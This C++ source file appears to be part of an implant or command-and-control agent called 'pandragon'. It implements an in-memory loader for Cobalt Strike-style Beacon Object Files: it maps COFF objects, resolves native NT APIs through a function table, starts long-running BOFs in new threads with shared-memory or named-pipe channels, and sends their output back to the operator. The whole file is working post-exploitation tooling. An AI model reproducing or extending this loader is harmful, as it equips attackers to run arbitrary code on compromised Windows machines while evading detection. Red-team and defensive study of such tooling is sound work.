/*
 * bof_runner.cpp - BOF Execution Engine
 *
 * Handles the full BOF execution lifecycle:
 * - Calls SetupCOFF to prepare the BOF
 * - Detects execution mode (blocking / long-running)
 * - Spawns threads for async BOFs
 * - Collects and forwards output
 * - Automatic cleanup
 */

#include <windows.h>
#include <stdint.h>
#include <stdbool.h>
#include <utility>

#include "../../include/coff/COFFSetup.h"
#include "../../include/coff/beacon_compatibility.h"
#include "../../include/utils.h"
#include "../../include/coff/coff_loader.h"
#include "../../include/network/net_abstract.h"
#include "../../include/resolver.h"
#include "../../include/pandragon_runtime.h"

static void executeBOFSafely(async_bof_thread_ctx* threadCtx) {
    threadCtx->bof_entry(threadCtx->argumentdata, (unsigned long)threadCtx->argumentSize);
    threadCtx->exitCode = 0;
    _InterlockedExchange(&threadCtx->signalledDone, 1);
}

static DWORD WINAPI asyncBofThreadProc(LPVOID lpParam) {
    async_bof_thread_ctx* threadCtx = (async_bof_thread_ctx*)lpParam;

    if (!threadCtx || !threadCtx->bof_entry) {
        if (threadCtx) {
            threadCtx->exitCode = COFF_ERR_SETUP;
            _InterlockedExchange(&threadCtx->completed, 1);
        }
        return 1;
    }

    executeBOFSafely(threadCtx);
    _InterlockedExchange(&threadCtx->completed, 1);

    /* Free the prepended argument buffer */
    if (threadCtx->argumentdata) {
        __free(threadCtx->argumentdata);
        threadCtx->argumentdata = NULL;
    }
    return 0;
}

static uint8_t* g_prepareScratchPage = nullptr;
static SIZE_T  g_prepareScratchSize = 0x1000;

static bool initPrepareScratch(functionTable* nt) {
    if (g_prepareScratchPage) return true;

    PVOID base = nullptr;
    SIZE_T size = g_prepareScratchSize;
    NTSTATUS st = nt->NtAllocateVirtualMemory(
        (HANDLE)-1, &base, 0, &size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(st) || !base) return false;

    g_prepareScratchPage = (uint8_t*)base;
    g_prepareScratchSize = size;
    return true;
}

static bof_prepared_channel* getPrepareChannel(void) {
    return (bof_prepared_channel*)g_prepareScratchPage;
}

static void termPrepareScratch(functionTable* nt) {
    if (!g_prepareScratchPage) return;

    PVOID base = (PVOID)g_prepareScratchPage;
    SIZE_T size = g_prepareScratchSize;
    nt->NtFreeVirtualMemory((HANDLE)-1, &base, &size, MEM_RELEASE);
    g_prepareScratchPage = nullptr;
}

std::pair<int, int> RunCOFF(
    functionTable* funcTable,
    char*            functionname,
    unsigned char*   coff_data,
    uint32_t         filesize,
    unsigned char*   argumentdata,
    int              argumentSize,
    uint32_t         task_id)
{
    if (!funcTable) return std::make_pair(COFF_ERR_NT_FUNCS, COFF_ERR_NT_FUNCS);

    int staleLen = 0;
    char* staleOutput = BeaconGetOutputData(&staleLen);
    if (staleOutput) __free(staleOutput);

    COFF_LOADED* ctx = (COFF_LOADED*)__malloc(sizeof(COFF_LOADED));
    if (!ctx) return std::make_pair(COFF_ERR_ALLOC_FAIL, COFF_ERR_ALLOC_FAIL);
    __memset(ctx, 0, sizeof(COFF_LOADED));

    int ret = SetupCOFF(funcTable, functionname, coff_data, filesize, ctx);
    if (ret != 0) {
        int outLen = 0;
        char* output = BeaconGetOutputData(&outLen);
        if (output && outLen > 0) {
            pandragon::sendBofOutput(output, outLen, task_id);
            __free(output);
        }
#ifdef DEBUG
        char detail[384];
        int sumLen = __snprintf(detail, sizeof(detail),
            "[BOF EXECUTION FAILURE] Entry='%s', BOF=%u bytes, args=%d bytes, ret=%d",
            functionname ? functionname : "NULL",
            filesize, argumentSize, ret);
        if (sumLen > 0 && sumLen < (int)sizeof(detail)) {
            pandragon::sendBofOutput(detail, sumLen, task_id);
        }
#endif
        __free(ctx);
        return std::make_pair(ret, ret);
    }

    if (!ctx->entryPoint) {
        debugPrint("[RunCOFF] entryPoint is NULL for task %u", task_id);
        CleanupCOFF(ctx);
        __free(ctx);
        return std::make_pair(COFF_ERR_ENTRY_NOT_FOUND, COFF_ERR_ENTRY_NOT_FOUND);
    }

#ifdef _MSC_VER
    void (__cdecl *bof_entry)(char*, unsigned long) =
        (void (__cdecl *)(char*, unsigned long))ctx->entryPoint;
#else
    void (*bof_entry)(char*, unsigned long) =
        (void (*)(char*, unsigned long))ctx->entryPoint;
#endif

    if (__strcmp(functionname, "prepare") == 0) {
        if (!initPrepareScratch(funcTable)) {
            CleanupCOFF(ctx);
            __free(ctx);
            return std::make_pair(COFF_ERR_ALLOC_FAIL, COFF_ERR_ALLOC_FAIL);
        }

        __memset(g_prepareScratchPage, 0, g_prepareScratchSize);

        bof_entry((char*)argumentdata, (unsigned long)argumentSize);

        bof_prepared_channel* desc = getPrepareChannel();
        CHANNEL_TYPE type = desc->type;

        async_bof_state* async_state = AsyncBofManager::instance().alloc();
        if (!async_state) {
            CleanupCOFF(ctx);
            __free(ctx);
            return std::make_pair(COFF_ERR_ALLOC_FAIL, COFF_ERR_ALLOC_FAIL);
        }

        async_state->bof_class = BOF_CLASS_LONG_RUNNING;
        async_state->channel_type = type;
        async_state->channel = nullptr;
        async_state->channel_size = 0;
        async_state->last_checkin = AsyncBofManager::instance().getCurrentTimeMs();

        if (type == CHANNEL_TYPE_SHMEM && desc->shmem_ptr) {
            async_state->channel = (bof_channel*)desc->shmem_ptr;
            async_state->channel_size = desc->buffer_size;
            async_state->comms_info.shmem_ptr = desc->shmem_ptr;
            debugPrint("[RunCOFF] prepare() returned SHMEM at %p (%u bytes)",
                desc->shmem_ptr, desc->buffer_size);
        } else if (type == CHANNEL_TYPE_NAMED_PIPE) {
            size_t name_len = 0;
            while (desc->pipe_name[name_len] != L'\0' && name_len < 259) name_len++;
            __memcpy(async_state->comms_info.pipe_name,
                       desc->pipe_name, name_len * sizeof(wchar_t));
            async_state->comms_info.pipe_name[name_len] = L'\0';
            debugPrint("[RunCOFF] prepare() returned named pipe: %S",
                desc->pipe_name);
        }

        AsyncBofManager::instance().insert(async_state);

        CleanupCOFF(ctx);
        __free(ctx);
        return std::make_pair(0, 0);
    }

    if (__strcmp(functionname, "go") == 0 && task_id != 0) {
        async_bof_state* async_state = AsyncBofManager::instance().find(task_id);
        if (!async_state || async_state->bof_class != BOF_CLASS_LONG_RUNNING) {
            debugPrint("[RunCOFF] go() called but no async state for task %u", task_id);
            CleanupCOFF(ctx);
            __free(ctx);
            return std::make_pair(COFF_ERR_SETUP, COFF_ERR_SETUP);
        }

        async_bof_thread_ctx* threadCtx =
            (async_bof_thread_ctx*)__malloc(sizeof(async_bof_thread_ctx));
        if (!threadCtx) {
            CleanupCOFF(ctx);
            __free(ctx);
            return std::make_pair(COFF_ERR_ALLOC_FAIL, COFF_ERR_ALLOC_FAIL);
        }

        threadCtx->bof_entry = bof_entry;
        
        /* Prepend channel pointer to BOF arguments so BOF can extract it */
        size_t new_arg_size = sizeof(void*) + argumentSize;
        char* new_args = (char*)__malloc(new_arg_size);
        if (!new_args) {
            CleanupCOFF(ctx);
            __free(ctx);
            __free(threadCtx);
            return std::make_pair(COFF_ERR_ALLOC_FAIL, COFF_ERR_ALLOC_FAIL);
        }
        /* First 8 bytes = channel pointer (or 4 bytes on x86, but we're x64) */
        *(void**)new_args = (void*)async_state->channel;
        if (argumentdata && argumentSize > 0) {
            __memcpy(new_args + sizeof(void*), argumentdata, argumentSize);
        }
        threadCtx->argumentdata = new_args;
        threadCtx->argumentSize = new_arg_size;
        threadCtx->ctx = ctx;
        threadCtx->task_id = task_id;
        threadCtx->funcTable = funcTable;
        threadCtx->completed = 0;
        threadCtx->signalledDone = 0;
        threadCtx->exitCode = 0;

        HANDLE hThread = NULL;
        NTSTATUS st = funcTable->NtCreateThreadEx(
            &hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1,
            (PVOID)asyncBofThreadProc, threadCtx,
            0, 0, 0x10000, 0x10000, NULL);

        if (!NT_SUCCESS(st) || !hThread) {
            debugPrint("[RunCOFF] Failed to create async thread for task %u: 0x%08x", task_id, st);
            __free(threadCtx);
            CleanupCOFF(ctx);
            __free(ctx);
            return std::make_pair(COFF_ERR_SETUP, COFF_ERR_SETUP);
        }

        async_state->handle = hThread;
        async_state->threadCtx = threadCtx;

        debugPrint("[RunCOFF] go() async task %u started in thread %p", task_id, hThread);
        return std::make_pair(0, 0);
    }

    bof_entry((char*)argumentdata, (unsigned long)argumentSize);

    int outLen = 0;
    char* output = BeaconGetOutputData(&outLen);
    if (output && outLen > 0) {
        pandragon::sendBofOutput(output, outLen, task_id);
        __free(output);
    } else {
#ifdef DEBUG
        char detail[512] = {};
        int detLen = __snprintf(detail, sizeof(detail),
            "[BOF NOTE] Entry '%s' executed but produced no output",
            functionname ? functionname : "NULL");
        if (detLen > 0 && detLen < (int)sizeof(detail)) {
            BeaconOutput(CALLBACK_OUTPUT, detail, detLen);
        }
#endif
    }

    CleanupCOFF(ctx);
    __free(ctx);
    return std::make_pair(0, 0);
}

void runTestBOF(functionTable* funcTable, const char* path) {
    size_t pathLen = __strlen(path);

    wchar_t* widePath = (wchar_t*)__malloc((pathLen + 1) * sizeof(wchar_t));
    if (!widePath) {
        debugPrint("[runTestBOF] Failed to allocate wide path");
        return;
    }

    size_t converted = __mbstowcs(widePath, path, pathLen + 1);
    if (converted == (size_t)-1) {
        debugPrint("[runTestBOF] Path conversion failed");
        __free(widePath);
        return;
    }
    widePath[converted] = L'\0';

    DWORD fileSize = 0;
    unsigned char* coffData = readFileFromDisk(funcTable, widePath, &fileSize);
    __free(widePath);

    if (!coffData) {
        debugPrint("[runTestBOF] Failed to read BOF from disk");
        return;
    }

    unsigned char emptyArgs[4] = {0, 0, 0, 0};

    auto result = RunCOFF(funcTable, const_cast<char*>("go"), coffData, fileSize,
                          emptyArgs, sizeof(emptyArgs), 0);
    __free(coffData);

    if (result.first != 0) {
        debugPrint("[runTestBOF] RunCOFF returned error: %d (error_code=%d)", result.first, result.second);
        return;
    }

    int outLen = 0;
    char* output = BeaconGetOutputData(&outLen);
    if (output && outLen > 0) {
        debugPrint("[BOF output] %s", output);
        __free(output);
    } else {
        debugPrint("[runTestBOF] BOF ran successfully (no text output.)");
    }
}